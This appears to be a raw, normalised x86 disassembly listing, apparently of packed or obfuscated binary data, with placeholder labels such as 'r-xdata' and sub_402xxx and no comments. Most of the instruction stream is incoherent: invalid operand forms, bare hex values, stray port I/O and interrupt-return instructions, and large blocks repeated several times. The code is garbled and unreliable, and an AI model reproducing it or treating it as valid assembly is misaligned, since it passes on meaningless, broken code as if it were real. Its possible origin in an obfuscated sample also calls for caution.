call 0xf48ef36
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bacd3
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f5fb9
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16840
pop edx
jge r-xdata
jo 0xffffffff854f8525
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44efeb
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcfd2a
jae r-xdata
call sub_402be2
jb 0xffffffff81b2a898
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa046
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b069
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_4029cd
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3c6d
add esp 0x4
jae r-xdata
jl 0xf3adae
jae r-xdata
jmp 0xffffffffff79ab14
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402a88
jae 0xffffffffff43b2ad
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f84a7
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8917f44
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b008
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a523
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
jae r-xdata
je 0xffffffffff6db0f5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402801
jns r-xdata
jns r-xdata
xor esi 0x58b93d7f
jno r-xdata
push ebp
call sub_402786
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
jno 0x7398826d
jg r-xdata
jne 0x24c13851
jae r-xdata
sub ecx 0xe1813e75
pop eax
jae r-xdata
add eax 0xf9b7159
test [ edx + 0xf ] ebx
and [ edi + edi * 8 ] 0x15ffffff
or [ 0xffffffffff6d830f ] 0xfe9ffff
mov [ edx - 0x7f000000 ] ecx
iretd
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jns r-xdata
jge 0xffffffffb8afa788
pushfd
call sub_402771
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402811
ja 0x504ac18
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
ja r-xdata
and ebx 0xcf812475
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
pop ecx
jno r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
pop edx
jg r-xdata
jpo 0xf70a0ee
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
je 0xffffffffa3a4cdc7
jg r-xdata
jg 0xffffffff9c947bfc
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ec28
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcab131
call sub_4028b1
xor edi 0x517f5859
jno 0xfffffffff2c1836e
push ecx
push ebx
call sub_402801
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
push esi
push esi
call sub_4028fc
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd81f3
push edx
call sub_402832
or edi 0x830f5858
jne r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jno 0x164015cb
jae r-xdata
je 0xffffffff814fc9c7
jne r-xdata
jno 0xffffffff834f7ff5
xor edx 0x81257159
r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac13121
sub_402811
pop eax
pop edx
pop eax
jae r-xdata
pop edx
pop eax
jae r-xdata
or eax 0xff6d830f
pop eax
pop ecx
jge r-xdata
jne 0xf44ec28
pop ecx
or eax 0xf04c483
mov ebp ebp
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
jne 0x24c13851
jno r-xdata
push ebp
call sub_402786
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jne r-xdata
and eax 0x8b0f327f
jae r-xdata
sub ecx 0xe1813e75
pushfd
call sub_402771
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402811
ja 0x504ac18
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jns r-xdata
jge 0xffffffffb8afa788
jae r-xdata
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcab131
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jno 0x164015cb
pop edx
jg r-xdata
jpo 0xf70a0ee
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jns r-xdata
xor edx 0x81257159
r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
jae r-xdata
je 0xffffffff814fc9c7
jne r-xdata
jno 0xffffffff834f7ff5
jg r-xdata
jg 0xffffffff9c947bfc
ja r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac13121
push esi
push esi
call sub_4028fc
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd81f3
push edx
call sub_402832
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jae r-xdata
je 0xffffffffa3a4cdc7
call sub_4028b1
xor edi 0x517f5859
jno 0xfffffffff2c1836e
push ecx
push ebx
call sub_402801
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
sub_402832
jg r-xdata
pop eax
add esp 0x4
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x164015cb
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab131
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70a0ee
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fc9c7
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ec28
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c947bfc
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_4028fc
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd81f3
push edx
call sub_402832
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f7ff5
push ebp
call sub_402786
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4cdc7
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac13121
jg r-xdata
jne 0x24c13851
jae r-xdata
sub ecx 0xe1813e75
call sub_4028b1
xor edi 0x517f5859
jno 0xfffffffff2c1836e
push ecx
push ebx
call sub_402801
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afa788
pushfd
call sub_402771
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402811
ja 0x504ac18
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub_40287d
pop eax
pop ecx
pop ecx
jae r-xdata
pop eax
pop eax
jae r-xdata
or edx 0xff50830f
pop ecx
pop eax
jg r-xdata
mov ebx 0x8f0f6975
pop edx
jne r-xdata
jno 0xfffffffff2c1836e
push ecx
push ebx
call sub_402801
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
pushfd
push ebx
push esp
pushfd
add esi 0xf337d58
test [ edi - 0x5b ] bh
pop ecx
jno r-xdata
jno 0x164015cb
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jns r-xdata
jmp 0xcab131
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
pop edx
jg r-xdata
jpo 0xf70a0ee
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jae r-xdata
sub eax 0x4d795a58
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ec28
jns r-xdata
xor edx 0x81257159
r-xdata
call sub_4028b1
xor edi 0x517f5859
push edi
push ebp
push ecx
and ecx 0xff378f0f
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jae r-xdata
je 0xffffffff814fc9c7
jne r-xdata
jno 0xffffffff834f7ff5
push ebp
call sub_402786
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jg r-xdata
jg 0xffffffff9c947bfc
ja r-xdata
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac13121
jg r-xdata
jne 0x24c13851
jae r-xdata
sub ecx 0xe1813e75
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd81f3
push edx
call sub_402832
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afa788
pushfd
call sub_402771
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402811
ja 0x504ac18
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4cdc7
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
push esi
push esi
call sub_4028fc
sub ebx 0xfeace855
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
sub_4028b1
pushfd
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x164015cb
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab131
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70a0ee
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fc9c7
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ec28
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c947bfc
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_4028fc
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd81f3
push edx
call sub_402832
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f7ff5
push ebp
call sub_402786
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4cdc7
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac13121
jg r-xdata
jne 0x24c13851
jae r-xdata
sub ecx 0xe1813e75
call sub_4028b1
xor edi 0x517f5859
jno 0xfffffffff2c1836e
push ecx
push ebx
call sub_402801
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afa788
push edi
push eax
push edx
call sub_402811
ja 0x504ac18
pushfd
call sub_402771
mov eax [ fs : 0xffffffff9ce8c173 ]
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
sub_4028fc
sub [ esp + 0x40 ] r-xdata
sub esp 0x10
pop edx
ja r-xdata
jg r-xdata
jmp [ 0xce8d0f ]
jge r-xdata
jmp 0xffffffff844f5ab2
jno r-xdata
sub esi 0x73bd047f
push ebp
ja r-xdata
jmp [ 0xfffffffff381df77 ]
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1e7e1
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
ja r-xdata
call 0xffca2f0
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a91b
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a466b7
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b152
ja r-xdata
jge 0x71fc6959
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
push ebp
pushfd
call sub_402a5a
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jno r-xdata
mov ebx 0xf04c483
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jne r-xdata
or edx 0xf3812e79
pushfd
push esi
call sub_402a51
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402b6b
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2ad06
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jno r-xdata
sub esi 0x89641f79
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16840
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f5fb9
jne r-xdata
sub edi 0x64244481
div [ eax ]
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacba7e
jae r-xdata
ja 0xffffffffa3c33a16
push ecx
push edx
push ebp
sub esp 0x4
call sub_402a1d
xor ebx 0x15ff4e7f
mov edx 0xff47830f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
ja r-xdata
pop edx
mov eax 0xff55870f
jg r-xdata
jpo 0xdeaffc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
ja r-xdata
xor ebx 0xff3d870f
call sub_4029cd
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
jmp 0xffffffffff79ab14
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93474
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402a7d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
add eax 0x5abb2979
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f030
jg r-xdata
ja 0xcaae2c
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f25f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48ef36
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bacd3
pop edx
jge r-xdata
jo 0xffffffff854f8525
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44efeb
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcfd2a
jae r-xdata
call sub_402be2
jb 0xffffffff81b2a898
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa046
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b069
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3c6d
add esp 0x4
jae r-xdata
jl 0xf3adae
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402a88
jae 0xffffffffff43b2ad
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f84a7
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8917f44
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b008
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a523
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
jae r-xdata
je 0xffffffffff6db0f5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
push esp
pushfd
push ecx
